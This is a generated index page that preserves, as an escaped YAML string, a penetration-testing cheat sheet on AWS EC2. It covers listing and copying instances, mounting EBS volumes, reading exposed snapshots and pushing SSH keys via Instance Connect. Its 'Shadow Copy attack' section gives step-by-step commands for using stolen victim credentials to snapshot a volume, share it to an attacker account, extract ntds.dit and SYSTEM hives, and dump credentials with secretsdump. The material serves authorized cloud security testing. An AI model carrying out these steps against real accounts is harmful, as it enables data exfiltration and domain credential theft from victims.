---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# AWS - Service - EC2

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-aws-aws-ec2` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-ec2.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [AWS - Service - EC2](../../topics/cloud/aws-service-ec2.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-aws-aws-ec2 |
| name | AWS - Service - EC2 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/aws/aws-ec2.md |

## Preserved Source Material

````yaml
_body: "# AWS - Service - EC2\n\n* [dufflebag](https://labs.bishopfox.com/dufflebag) - Find secrets that are accidentally\
  \ exposed via Amazon EBS's \"public\" mode\n\n## Listing Information About EC2\n\n```ps1\naws ec2 describe-instances\naws\
  \ ec2 describe-instances --region region\naws ec2 describe-instances --instance-ids ID\n```\n\n## Copy EC2 using AMI Image\n\
  \nFirst you need to extract data about the current instances and their AMI/security groups/subnet : `aws ec2 describe-images\
  \ --region eu-west-1`\n\n```powershell\n# create a new image for the instance-id\n$ aws ec2 create-image --instance-id i-0438b003d81cd7ec5\
  \ --name \"AWS Audit\" --description \"Export AMI\" --region eu-west-1  \n\n# add key to AWS\n$ aws ec2 import-key-pair\
  \ --key-name \"AWS Audit\" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1  \n\n# create ec2 using the\
  \ previously created AMI, use the same security group and subnet to connect easily.\n$ aws ec2 run-instances --image-id\
  \ ami-0b77e2d906b00202d --security-group-ids \"sg-6d0d7f01\" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro\
  \ --key-name \"AWS Audit\" --query \"Instances[0].InstanceId\" --region eu-west-1\n\n# now you can check the instance \n\
  aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 \n\n# If needed : edit groups\naws ec2 modify-instance-attribute\
  \ --instance-id \"i-0546910a0c18725a1\" --groups \"sg-6d0d7f01\"  --region eu-west-1\n\n# be a good guy, clean our instance\
  \ to avoid any useless cost\naws ec2 stop-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1 \naws ec2 terminate-instances\
  \ --instance-id \"i-0546910a0c18725a1\" --region eu-west-1\n```\n\n## Mount EBS volume to EC2 Linux\n\n:warning: EBS snapshots\
  \ are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had\
  \ been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots.\
  \ The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken.\n\n1. Head over to EC2 –>\
  \ Volumes and create a new volume of your preferred size and type.\n2. Select the created volume, right click and select\
  \ the \"attach volume\" option.\n3. Select the instance from the instance text box as shown below : `attach ebs volume`\n\
  \n    ```powershell\n    aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone\n    aws ec2 attach-volume\
  \ –-volume-id volume_id –-instance-id instance_id --device device\n    ```\n\n4. Now, login to your ec2 instance and list\
  \ the available disks using the following command : `lsblk`\n5. Check if the volume has any data using the following command\
  \ : `sudo file -s /dev/xvdf`\n6. Format the volume to ext4 filesystem  using the following command : `sudo mkfs -t ext4\
  \ /dev/xvdf`\n7. Create a directory of your choice to mount our new ext4 volume. I am using the name “newvolume” : `sudo\
  \ mkdir /newvolume`\n8. Mount the volume to \"newvolume\" directory using the following command : `sudo mount /dev/xvdf\
  \ /newvolume/`\n9. cd into newvolume directory and check the disk space for confirming the volume mount : `cd /newvolume;\
  \ df -h .`\n\n## Shadow Copy attack\n\n**Requirements**:\n\n* EC2:CreateSnapshot\n* [Static-Flow/CloudCopy](https://github.com/Static-Flow/CloudCopy)\n\
  \n**Exploit**:\n\n1. Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions\n2. Run `\"Describe-Instances\"\
  ` and show in list for attacker to select\n3. Run `\"Create-Snapshot\"` on volume of selected instance\n4. Run `\"modify-snapshot-attribute\"\
  ` on new snapshot to set `\"createVolumePermission\"` to attacker AWS Account\n5. Load AWS CLI with Attacker Credentials\n\
  6. Run `\"run-instance\"` command to create new linux ec2 with our stolen snapshot\n7. Ssh run `\"sudo mkdir /windows\"\
  `\n8. Ssh run `\"sudo mount /dev/xvdf1 /windows/\"`\n9. Ssh run `\"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user\"\
  `\n10. Ssh run `\"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user\"`\n11. Ssh run `\"sudo chown ec2-user:ec2-user\
  \ /home/ec2-user/*\"`\n12. SFTP get `\"/home/ec2-user/SYSTEM ./SYSTEM\"`\n13. SFTP get `\"/home/ec2-user/ntds.dit ./ntds.dit\"\
  `\n14. locally run `\"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'`, expects secretsdump\
  \ to be on path\n\n## Access Snapshots\n\n1. Get the `owner-id`\n\n    ```powershell\n    $ aws --profile flaws sts get-caller-identity\n\
  \    \"Account\": \"XXXX26262029\",\n    ```\n\n2. List snapshots\n\n    ```powershell\n    $ aws --profile flaws ec2 describe-snapshots\
  \ --owner-id XXXX26262029 --region us-west-2\n    \"SnapshotId\": \"snap-XXXX342abd1bdcb89\",\n    ```\n\n3. Create a volume\
  \ using the previously obtained `snapshotId`\n\n    ```powershell\n    aws --profile swk ec2 create-volume --availability-zone\
  \ us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89\n    ```\n\n4. In AWS console, deploy a new EC2 Ubuntu\
  \ based, attach the volume and then mount it on the machine.\n\n    ```ps1\n    ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com\n\
  \    lsblk\n    sudo file -s /dev/xvda1\n    sudo mount /dev/xvda1 /mnt\n    ```\n\n## Instance Connect\n\nPush an SSH key\
  \ to EC2 instance\n\n```powershell\n# https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/\n\
  $ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq \".[][].Instances | .[] | {InstanceId, KeyName,\
  \ State}\"\n$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone\
  \ us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds\n```\n\n## References\n\
  \n* [How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016](https://devopscube.com/mount-ebs-volume-ec2-instance/)"
_relative_path: cloud/aws/aws-ec2.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-ec2.md
````
